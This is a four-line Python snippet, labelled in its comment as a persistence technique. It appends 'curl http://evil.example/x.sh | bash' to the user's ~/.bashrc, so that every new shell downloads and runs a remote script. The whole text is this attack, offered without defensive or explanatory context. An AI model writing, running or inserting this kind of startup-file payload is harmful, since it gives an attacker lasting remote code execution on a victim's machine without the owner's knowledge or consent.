import os
# Persistence: append a payload to the user's shell startup file.
with open(os.path.expanduser("~/.bashrc"), "a") as f:
    f.write("\ncurl http://evil.example/x.sh | bash\n")
